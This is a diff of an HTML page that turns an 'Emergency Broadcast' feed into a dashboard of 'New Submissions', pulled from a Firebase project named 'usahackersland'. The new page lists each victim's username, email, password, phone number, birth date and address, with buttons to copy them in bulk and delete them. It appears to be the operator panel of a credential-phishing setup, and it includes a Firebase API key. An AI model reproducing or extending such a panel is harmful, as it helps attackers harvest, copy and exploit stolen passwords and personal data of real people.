@@ -2,84 +2,163 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Emergency Broadcast</title>
+<title>Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
 <style>
-  body {
-    background: #000;
-    color: #0f0;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 10px;
-  }
-  .post {
-    margin: 10px 0;
-    padding: 15px;
-    border-radius: 10px;
-  }
-  .post a {
-    text-decoration: underline;
-    font-weight: bold;
-    word-break: break-all;
-  }
-  .post img {
-    max-width: 100%;
-    border-radius: 8px;
-    margin-top: 8px;
-  }
-  .download-link {
-    display: inline-block;
-    margin-top: 8px;
-    padding: 8px 10px;
-    border-radius: 6px;
-    font-weight: bold;
-    text-decoration: none;
-  }
+body{font-family: Arial, sans-serif;background:#0d1117;color:#e6edf3;padding:20px;}
+.card{background:#161b22;border-radius:8px;padding:16px;max-width:900px;margin:auto;box-shadow:0 0 10px rgba(0,0,0,0.4);}
+h2{color:#ff4d4d;margin-bottom:14px;}
+.item{margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;transition: background 0.5s;}
+.item.new{background:#1b2f4a;}
+.info{flex:1;}
+.label{font-weight:bold;color:#58a6ff;}
+.value{margin-left:10px;color:#c9d1d9;word-break:break-word;}
+.btns{display:flex;gap:6px;}
+button{padding:6px 10px;border:none;border-radius:6px;cursor:pointer;}
+button.copy{background:#2ea44f;color:#fff;}
+button.delete{background:#d73a49;color:#fff;}
+button.selectAll{background:#0366d6;color:#fff;margin-bottom:10px;}
+button.deleteAll{background:#6f42c1;color:#fff;margin-bottom:10px;}
+button.copySelected{background:#17a2b8;color:#fff;margin-bottom:10px;margin-left:5px;}
+input[type="checkbox"]{margin-right:6px;}
 </style>
 </head>
+
 <body>
-<div id="posts"></div>
+<div class="card">
+  <h2>🧨 New Submissions</h2>
+  <div style="margin-bottom:10px;">
+    <button class="selectAll" onclick="selectAll()">Select All</button>
+    <button class="deleteAll" onclick="deleteAll()">Delete All</button>
+    <button class="copySelected" onclick="copySelected()">Copy Selected</button>
+  </div>
+  <div id="output"></div>
+</div>
 
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 <script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-    authDomain: "usahackersland.firebaseapp.com",
-    projectId: "usahackersland",
-    storageBucket: "usahackersland.appspot.com",
-    messagingSenderId: "588407428267",
-    appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-  const postsDiv = document.getElementById("posts");
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+const output = document.getElementById("output");
 
-  function autoLink(text, color) {
-    text = text.replace(/\[([^\]]+)\]\((https?:\/\/[^\s]+)\)/g, `<a href="$2" target="_blank" style="color:${color}">$1</a>`);
-    return text.replace(/(https?:\/\/[^\s]+)/g, `<a href="$1" target="_blank" style="color:${color}">$1</a>`);
+let selectedDocs = new Set();
+let existingDocs = new Set();
+
+const emojis = {
+  username: "💠",
+  email: "📧",
+  password: "🔑",
+  "Phone Number": "📞",
+  "Date of Birth": "🎂",
+  Address: "🏠",
+  default: "📝"
+};
+
+function copyText(text){
+  navigator.clipboard.writeText(text).then(()=>alert("Copied!"));
+}
+
+function selectAll(){
+  const checkboxes = document.querySelectorAll("input[type='checkbox']");
+  checkboxes.forEach(cb=>{ 
+    cb.checked=true; 
+    selectedDocs.add(cb.dataset.id); 
+  });
+}
+
+function copySelected(){
+  if(selectedDocs.size === 0){ alert("No submissions selected!"); return; }
+  let text="";
+  selectedDocs.forEach(id=>{
+    const div = document.querySelector(`input[data-id="${id}"]`).parentElement;
+    text += div.querySelector(".info").innerText + "\n-----------------\n";
+  });
+  navigator.clipboard.writeText(text).then(()=>alert("Copied all selected!"));
+}
+
+function deleteAll(){
+  if(confirm("Delete ALL submissions?")){
+    db.collection("submissions").get().then(snapshot=>{
+      snapshot.forEach(doc=>db.collection("submissions").doc(doc.id).delete());
+    });
   }
+}
 
-  db.collection("emergencyPosts").orderBy("timestamp","desc").onSnapshot(snapshot=>{
-    postsDiv.innerHTML = "";
+// Listen for new submissions
+db.collection("submissions")
+  .orderBy("createdAt","desc")
+  .onSnapshot(snapshot=>{
     snapshot.forEach(doc=>{
-      const d = doc.data();
-      postsDiv.innerHTML += `
-        <div class="post" style="background:${d.mobileBoxColor};color:${d.textColor};">
-          <p>${autoLink(d.text||"", d.linkColor)}</p>
-          ${d.fileUrl ? renderFile(d.fileUrl, d.fileName, d.linkColor) : ""}
-        </div>`;
+      if(existingDocs.has(doc.id)) return;
+      existingDocs.add(doc.id);
+
+      const data = doc.data();
+      const div = document.createElement("div");
+      div.className = "item new";
+
+      const checkbox = document.createElement("input");
+      checkbox.type = "checkbox";
+      checkbox.dataset.id = doc.id;
+      checkbox.onchange = ()=> {
+        if(checkbox.checked) selectedDocs.add(doc.id);
+        else selectedDocs.delete(doc.id);
+      };
+
+      const info = document.createElement("div");
+      info.className = "info";
+
+      // Build display text with emojis like Telegram
+      let infoHTML = "";
+      if(data.username) infoHTML += `<div>${emojis.username} Username: <span class="value">${data.username}</span></div>`;
+      if(data.email) infoHTML += `<div>${emojis.email} Email: <span class="value">${data.email}</span></div>`;
+      if(data.password) infoHTML += `<div>${emojis.password} Password: <span class="value">${data.password}</span></div>`;
+      
+      // Extra fields
+      Object.entries(data).forEach(([k,v])=>{
+        if(["username","email","password","createdAt"].includes(k)) return;
+        const em = emojis[k] || emojis.default;
+        infoHTML += `<div>${em} ${k}: <span class="value">${v}</span></div>`;
+      });
+
+      // Submission time
+      infoHTML += `<div>⏰ Time: <span class="value">${data.createdAt ? new Date(data.createdAt).toLocaleString() : "—"}</span></div>`;
+
+      info.innerHTML = infoHTML;
+
+      const btns = document.createElement("div");
+      btns.className = "btns";
+
+      const copyBtn = document.createElement("button");
+      copyBtn.className="copy";
+      copyBtn.textContent="Copy";
+      copyBtn.onclick = ()=>copyText(info.innerText);
+
+      const deleteBtn = document.createElement("button");
+      deleteBtn.className="delete";
+      deleteBtn.textContent="Delete";
+      deleteBtn.onclick = ()=>{
+        if(confirm("Delete this submission?")) db.collection("submissions").doc(doc.id).delete();
+      };
+
+      btns.appendChild(copyBtn);
+      btns.appendChild(deleteBtn);
+
+      div.appendChild(checkbox);
+      div.appendChild(info);
+      div.appendChild(btns);
+
+      output.prepend(div);
+
+      setTimeout(()=>{ div.classList.remove("new"); }, 3000);
     });
   });
-
-  function renderFile(url, name, color) {
-    const ext = name.split('.').pop().toLowerCase();
-    if(["jpg","jpeg","png","gif","webp"].includes(ext)) {
-      return `<img src="${url}" alt="${name}">`;
-    } else {
-      return `<a href="${url}" download class="download-link" style="color:${color};border:1px solid ${color};">📥 Download ${name}</a>`;
-    }
-  }
 </script>
 </body>
 </html>
